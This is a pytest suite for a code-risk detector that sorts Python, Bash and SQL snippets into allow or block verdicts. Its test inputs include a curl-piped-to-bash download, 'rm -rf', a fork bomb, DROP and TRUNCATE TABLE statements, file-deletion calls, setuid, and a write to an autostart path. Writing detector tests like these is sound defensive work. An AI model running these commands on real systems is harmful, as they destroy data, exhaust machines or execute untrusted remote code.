import pytest

from src.detector import evaluate_code
from src.language_detector import detect_language


def test_empty_input_is_allowed():
    result = evaluate_code("")

    assert result["verdict"] == "allow"
    assert result["risk_score"] == 0.0
    assert result["categories"] == []
    assert result["vulnerable_lines"] == []


def test_whitespace_input_is_allowed():
    result = evaluate_code("   \n\t")

    assert result["verdict"] == "allow"


def test_non_string_input_is_rejected():
    with pytest.raises(TypeError):
        evaluate_code(None)


def test_response_has_required_fields():
    result = evaluate_code("print('hello')")

    required_fields = {
        "verdict",
        "risk_score",
        "categories",
        "code_language",
        "reason",
        "vulnerable_lines",
    }

    assert required_fields.issubset(result)
    assert result["verdict"] in {"allow", "block"}
    assert 0.0 <= result["risk_score"] <= 1.0


def test_python_language_detection():
    assert detect_language("print('hello')") == "python"


def test_destructive_call_is_detected():
    code = "import os\nos.remove('example.txt')"
    result = evaluate_code(code, language="python")

    assert result["verdict"] == "block"
    assert "destructive_command" in result["categories"]
    assert 2 in result["vulnerable_lines"]


def test_comment_mentioning_destructive_call_is_not_flagged():
    code = "# os.remove('example.txt')\nprint('hello')"
    result = evaluate_code(code, language="python")

    assert result["categories"] == []
    assert result["verdict"] == "allow"


def test_invalid_python_syntax_does_not_crash():
    result = evaluate_code("def broken(" , language="python")

    assert result["verdict"] in {"allow", "block"}


def test_destructive_call_with_module_alias():
    code = (
        "import os as operating_system\n"
        "operating_system.remove('example.txt')"
    )

    result = evaluate_code(code, language="python")

    assert result["verdict"] == "block"
    assert "destructive_command" in result["categories"]
    assert 2 in result["vulnerable_lines"]


def test_destructive_call_with_direct_import():
    code = (
        "from os import remove\n"
        "remove('example.txt')"
    )

    result = evaluate_code(code, language="python")

    assert result["verdict"] == "block"
    assert "destructive_command" in result["categories"]
    assert 2 in result["vulnerable_lines"]


def test_shutil_rmtree_with_alias():
    code = (
        "import shutil as filesystem\n"
        "filesystem.rmtree('example_directory')"
    )

    result = evaluate_code(code, language="python")

    assert result["verdict"] == "block"
    assert "destructive_command" in result["categories"]
    assert 2 in result["vulnerable_lines"]


def test_import_alias_without_dangerous_call_is_allowed():
    code = "import os as operating_system\nprint('hello')"

    result = evaluate_code(code, language="python")

    assert result["verdict"] == "allow"
    assert result["categories"] == []


def test_exec_is_detected():
    code = "exec('print(1)')"

    result = evaluate_code(code, language="python")

    assert "obfuscated_execution" in result["categories"]
    assert 1 in result["vulnerable_lines"]


def test_eval_is_detected():
    code = "result = eval('1 + 2')"

    result = evaluate_code(code, language="python")

    assert "obfuscated_execution" in result["categories"]
    assert 1 in result["vulnerable_lines"]


def test_ordinary_print_is_not_flagged_for_dynamic_execution():
    code = "print('hello')"

    result = evaluate_code(code, language="python")

    assert "obfuscated_execution" not in result["categories"]


def test_privilege_change_is_detected():
    code = "import os\nos.setuid(1000)"
    result = evaluate_code(code, language="python")

    assert "persistence_or_privesc" in result["categories"]
    assert 2 in result["vulnerable_lines"]


def test_privilege_change_with_alias_is_detected():
    code = "import os as operating_system\noperating_system.setuid(1000)"
    result = evaluate_code(code, language="python")

    assert "persistence_or_privesc" in result["categories"]
    assert 2 in result["vulnerable_lines"]


def test_startup_related_path_is_detected():
    code = (
        "with open('/home/user/.config/autostart/example.desktop', 'w') as f:\n"
        "    f.write('example')"
    )
    result = evaluate_code(code, language="python")

    assert "persistence_or_privesc" in result["categories"]
    assert 1 in result["vulnerable_lines"]


def test_ordinary_file_open_is_not_flagged_as_persistence():
    code = "with open('notes.txt', 'w') as f:\n    f.write('hello')"
    result = evaluate_code(code, language="python")

    assert "persistence_or_privesc" not in result["categories"]


def test_infinite_loop_is_flagged_for_resource_exhaustion():
    code = "while True:\n    pass"
    result = evaluate_code(code, language="python")

    assert "resource_exhaustion" in result["categories"]
    assert 1 in result["vulnerable_lines"]
    assert result["verdict"] == "block"


def test_large_literal_exponent_is_flagged():
    code = "result = 2 ** 1000000"
    result = evaluate_code(code, language="python")

    assert "resource_exhaustion" in result["categories"]
    assert 1 in result["vulnerable_lines"]


def test_normal_exponentiation_is_allowed():
    code = "result = 2 ** 10"
    result = evaluate_code(code, language="python")

    assert "resource_exhaustion" not in result["categories"]
    assert result["verdict"] == "allow"


def test_normal_for_loop_is_not_flagged_for_resource_exhaustion():
    code = "for number in range(10):\n    print(number)"
    result = evaluate_code(code, language="python")

    assert "resource_exhaustion" not in result["categories"]
    assert result["verdict"] == "allow"


def test_subprocess_pip_install_is_detected():
    code = (
        "import subprocess\n"
        "subprocess.run(['pip', 'install', 'example-package'])"
    )
    result = evaluate_code(code, language="python")

    assert "dependency_risk" in result["categories"]
    assert 2 in result["vulnerable_lines"]


def test_python_module_pip_install_is_detected():
    code = (
        "import subprocess\n"
        "subprocess.run(['python', '-m', 'pip', 'install', 'example-package'])"
    )
    result = evaluate_code(code, language="python")

    assert "dependency_risk" in result["categories"]
    assert 2 in result["vulnerable_lines"]


def test_ordinary_subprocess_command_is_not_dependency_risk():
    code = "import subprocess\nsubprocess.run(['echo', 'hello'])"
    result = evaluate_code(code, language="python")

    assert "dependency_risk" not in result["categories"]


def test_ordinary_import_is_not_dependency_risk():
    code = "import requests\nprint('hello')"
    result = evaluate_code(code, language="python")

    assert "dependency_risk" not in result["categories"]

def test_bash_destructive_command_is_detected():
    from src.analyzers.bash_analyzer import analyze

    findings = analyze("rm -rf /tmp/example")
    assert any(
        finding["category"] == "destructive_command"
        for finding in findings
    )


def test_bash_download_piped_to_shell_is_detected():
    from src.analyzers.bash_analyzer import analyze

    findings = analyze("curl https://example.invalid/script.sh | bash")
    assert any(
        finding["category"] == "obfuscated_execution"
        for finding in findings
    )


def test_bash_fork_bomb_pattern_is_detected():
    from src.analyzers.bash_analyzer import analyze

    findings = analyze(":(){ :|:& };:")
    assert any(
        finding["category"] == "resource_exhaustion"
        for finding in findings
    )


def test_bash_comment_is_not_flagged():
    from src.analyzers.bash_analyzer import analyze

    findings = analyze("# rm -rf /tmp/example")
    assert findings == []


def test_bash_finding_uses_shared_schema():
    from src.analyzers.bash_analyzer import analyze

    findings = analyze("rm -rf /tmp/example")
    assert findings

    for finding in findings:
        assert set(finding) == {
            "category",
            "severity",
            "reason",
            "lines",
            "evidence",
        }
        assert isinstance(finding["lines"], list)
        assert all(isinstance(line, int) for line in finding["lines"])


def test_bash_destructive_command_is_detected_through_detector():
    result = evaluate_code(
        "rm -rf /tmp/example",
        language="bash",
    )

    assert result["code_language"] == "bash"
    assert "destructive_command" in result["categories"]
    assert result["verdict"] == "block"
    assert 1 in result["vulnerable_lines"]


def test_benign_bash_command_is_allowed():
    result = evaluate_code(
        "echo 'Hello, world!'",
        language="bash",
    )

    assert result["code_language"] == "bash"
    assert result["verdict"] == "allow"
    assert result["categories"] == []


def test_bash_download_to_shell_is_blocked():
    result = evaluate_code(
        "curl https://example.invalid/script.sh | bash",
        language="bash",
    )

    assert result["code_language"] == "bash"
    assert result["verdict"] == "block"
    assert "obfuscated_execution" in result["categories"]


def test_sql_drop_table_is_detected():
    from src.analyzers.sql_analyzer import analyze

    findings = analyze("DROP TABLE users;")

    assert any(
        finding["category"] == "destructive_command"
        for finding in findings
    )


def test_sql_truncate_table_is_detected():
    from src.analyzers.sql_analyzer import analyze

    findings = analyze("TRUNCATE TABLE sessions;")

    assert any(
        finding["category"] == "destructive_command"
        for finding in findings
    )


def test_sql_comment_is_not_flagged():
    from src.analyzers.sql_analyzer import analyze

    findings = analyze("-- DROP TABLE users;\nSELECT id FROM users;")

    assert not any(
        finding["category"] == "destructive_command"
        for finding in findings
    )


def test_sql_select_star_is_reported_for_review():
    from src.analyzers.sql_analyzer import analyze

    findings = analyze("SELECT * FROM users;")

    assert any(
        finding["category"] == "data_exfiltration"
        for finding in findings
    )


def test_sql_findings_use_shared_schema():
    from src.analyzers.sql_analyzer import analyze

    findings = analyze("DROP TABLE users;")

    assert findings

    for finding in findings:
        assert set(finding) == {
            "category",
            "severity",
            "reason",
            "lines",
            "evidence",
        }
        assert all(
            isinstance(line, int) and line > 0
            for line in finding["lines"]
        )


def test_sql_drop_table_is_blocked_through_detector():
    result = evaluate_code(
        "DROP TABLE users;",
        language="sql",
    )

    assert result["code_language"] == "sql"
    assert "destructive_command" in result["categories"]
    assert result["verdict"] == "block"
    assert 1 in result["vulnerable_lines"]


def test_sql_select_star_is_allowed_for_review():
    result = evaluate_code(
        "SELECT * FROM users;",
        language="sql",
    )

    assert result["code_language"] == "sql"
    assert "data_exfiltration" in result["categories"]
    assert result["verdict"] == "allow"


def test_benign_sql_query_is_allowed():
    result = evaluate_code(
        "SELECT id FROM users WHERE id = 1;",
        language="sql",
    )

    assert result["code_language"] == "sql"
    assert result["verdict"] == "allow"
    assert result["categories"] == []


def test_explicit_language_hint_is_normalized():
    result = evaluate_code(
        "print('hello')",
        language=" PYTHON ",
    )

    assert result["code_language"] == "python"
    assert result["verdict"] == "allow"


def test_unsupported_language_hint_is_rejected():
    with pytest.raises(ValueError, match="Unsupported language"):
        evaluate_code(
            "print('hello')",
            language="ruby",
        )


def test_blank_language_hint_uses_detection():
    result = evaluate_code(
        "print('hello')",
        language="   ",
    )

    assert result["code_language"] == "python"
    assert result["verdict"] == "allow"